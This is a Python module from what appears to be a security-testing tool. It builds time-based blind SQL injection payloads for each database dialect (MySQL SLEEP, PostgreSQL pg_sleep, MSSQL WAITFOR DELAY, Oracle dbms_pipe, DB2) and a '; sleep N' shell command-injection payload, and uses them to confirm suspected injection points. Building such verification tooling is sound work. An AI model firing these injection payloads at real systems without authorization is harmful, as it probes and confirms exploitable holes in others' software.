"""SQL 方言 sleep 弹药。

缺口：时间盲注是「威力大、不破坏」的最佳确认弹——探针织不到 DB 驱动内部时，
它是唯一能独立旁证 sink 触达的通道（D2 时延双阈值门，见 d2_facade._time_blind_confirmed）。
但这条通道有个前提：**A2 得先产出一条 sleep 型 payload**。实测大量 SQLi spec 的
payload 全是报错型/布尔型（`' OR '1'='1`），`first_sleep_payload` 返回 None →
时间盲注通道根本没子弹 → 该族只能靠 canary 到 sink，到不了就 no_evidence。

修复两条：
  1. **补弹药**：按 db_type 现造一条方言 sleep 弹（MySQL SLEEP / PG pg_sleep /
     MSSQL WAITFOR DELAY / Oracle dbms_pipe / shell sleep）。
  2. **先判后投**：环境事实（runtime_facts.db_type）已知就只投**一组**（sleep + 无害基线
     共 2 次重放），不穷举方言；内嵌库（H2/HSQLDB/Derby/SQLite）没有便携 sleep，
     明确返回 None，让通道早退，别浪费预算投不可能生效的弹。

时延取 3s（SLEEP_SECONDS_DEFAULT）：D2 的 _TIME_BLIND_MIN_MS=1500 把「预期时延 <1.5s」
一律判为不可采信（普通网络抖动即可达标），SLEEP(1) 这种弹药投了也白投。

设计红线：
  - 语法必须按方言分开写。**PostgreSQL 的 pg_sleep 返回 void，不能进布尔表达式**
    （`1 OR pg_sleep(3)` 直接报 "argument of OR must be type boolean"），必须走
    `; SELECT pg_sleep(3)`。写成通用 `OR <fn>` 会让 PG 靶场 100% 打不中。
  - MSSQL 的 WAITFOR DELAY 是**语句**不是表达式，必须先 `;` 收尾上一条。
  - 事实缺失（db_type 未知）时 fail-open 退回 MySQL 形态（Java 靶场最常见），
    但要在 reason 里写明是猜的，别让对账把「猜对了」当成「判对了」。
"""
from __future__ import annotations

from typing import Any, Dict, Optional

# 预期时延取 3s：低于 1.5s 会被 D2 时延门直接判为不可采信（见模块 docstring）。
SLEEP_SECONDS_DEFAULT = 3

_DB_ALIASES: Dict[str, str] = {
    "mysql": "mysql", "mariadb": "mysql", "tidb": "mysql",
    "postgres": "postgresql", "postgresql": "postgresql", "pgsql": "postgresql", "pg": "postgresql",
    "mssql": "mssql", "sqlserver": "mssql", "sql_server": "mssql", "jtds": "mssql",
    "oracle": "oracle", "ora": "oracle",
    "db2": "db2",
    "h2": "h2", "hsqldb": "hsqldb", "hsql": "hsqldb", "derby": "derby", "sqlite": "sqlite",
}

# 没有便携 sleep 的内嵌数据库：投 sleep 弹必然不生效，通道应早退而不是浪费预算。
_NO_SLEEP_DB = {"h2", "hsqldb", "derby", "sqlite"}


def normalize_db_type(raw: Any) -> str:
    """环境事实里的 db_type → 方言组键。未知返回 ""。"""
    t = str(raw or "").strip().lower().replace("-", "_").replace(" ", "")
    if not t:
        return ""
    if t in _DB_ALIASES:
        return _DB_ALIASES[t]
    for k, v in _DB_ALIASES.items():
        if k in t:
            return v
    return ""


def supports_sleep(db_type: Any) -> bool:
    group = normalize_db_type(db_type)
    if not group:
        return True      # 未知：fail-open，退回 MySQL 形态试一发
    return group not in _NO_SLEEP_DB


def _mysql(base: str, s: int) -> str:
    # SLEEP 返回 0/1，可直接进布尔表达式
    return f"{base} OR SLEEP({s})-- "


def _postgresql(base: str, s: int) -> str:
    # pg_sleep 返回 void，进不了布尔表达式 —— 必须作为独立语句执行
    return f"{base}; SELECT pg_sleep({s})-- "


def _mssql(base: str, s: int) -> str:
    # WAITFOR DELAY 是语句不是表达式，必须先分号收尾
    return f"{base}; WAITFOR DELAY '0:0:{s}'-- "


def _oracle(base: str, s: int) -> str:
    # dbms_pipe.receive_message 返回 number，需套进 1=... 才是布尔
    return f"{base} AND 1=dbms_pipe.receive_message('SASTAI',{s})-- "


def _db2(base: str, s: int) -> str:
    return f"{base} OR 1=(SELECT 1 FROM SYSIBM.SYSDUMMY1 WHERE SLEEP({s}) IS NULL)-- "


def _shell(base: str, s: int) -> str:
    return f"{base}; sleep {s} #"


_SLEEP_BUILDERS = {
    "mysql": _mysql,
    "postgresql": _postgresql,
    "mssql": _mssql,
    "oracle": _oracle,
    "db2": _db2,
}
_SHELL_FAMILY_TOKENS = ("command", "rce", "cmd", "shell", "exec")


def sleep_fragment(db_type: Any, seconds: int = SLEEP_SECONDS_DEFAULT, family: str = "") -> str:
    """取该方言的 sleep 片段（不含前缀原值）。不支持返回 ""。"""
    f = str(family or "").lower()
    if any(t in f for t in _SHELL_FAMILY_TOKENS) and "sql" not in f:
        return f"sleep {int(seconds)}"
    group = normalize_db_type(db_type) or "mysql"
    if group in _NO_SLEEP_DB:
        return ""
    fn = _SLEEP_BUILDERS.get(group)
    if fn is None:
        return ""
    return fn("", int(seconds)).strip()


def build_sleep_payload(db_type: Any, base_value: str = "", seconds: int = SLEEP_SECONDS_DEFAULT,
                        family: str = "") -> Optional[str]:
    """按方言造一条 sleep 型 payload。

    base_value 是 A2 已经产出的那条注入弹（保留了它自带的引号闭合/注释形态），
    本函数只在其后接上时延片段，不重写闭合逻辑——重写必错（不知道注入点上下文）。
    """
    s = int(seconds or 0)
    if s <= 0:
        s = SLEEP_SECONDS_DEFAULT
    base = str(base_value or "")
    f = str(family or "").lower()
    if any(t in f for t in _SHELL_FAMILY_TOKENS) and "sql" not in f:
        return _shell(base or "1", s)
    group = normalize_db_type(db_type) or "mysql"
    if group in _NO_SLEEP_DB:
        return None
    fn = _SLEEP_BUILDERS.get(group)
    if fn is None:
        return None
    return fn(base or "1", s)


def dialect_reason(db_type: Any, family: str = "") -> str:
    """这条弹药是判出来的还是猜出来的——落进证据里，别让对账把猜对的当判对的。"""
    raw = str(db_type or "").strip()
    if not raw:
        return "db_type 事实缺失，fail-open 退回 MySQL 形态（未判定，属猜测）"
    group = normalize_db_type(raw) or "未知方言"
    if group in _NO_SLEEP_DB:
        return f"db_type={raw} 为内嵌库，无便携 sleep，时间盲注通道不适用（不投放）"
    return f"db_type={raw} → 方言 {group}，只投该组 sleep+基线共 2 次"
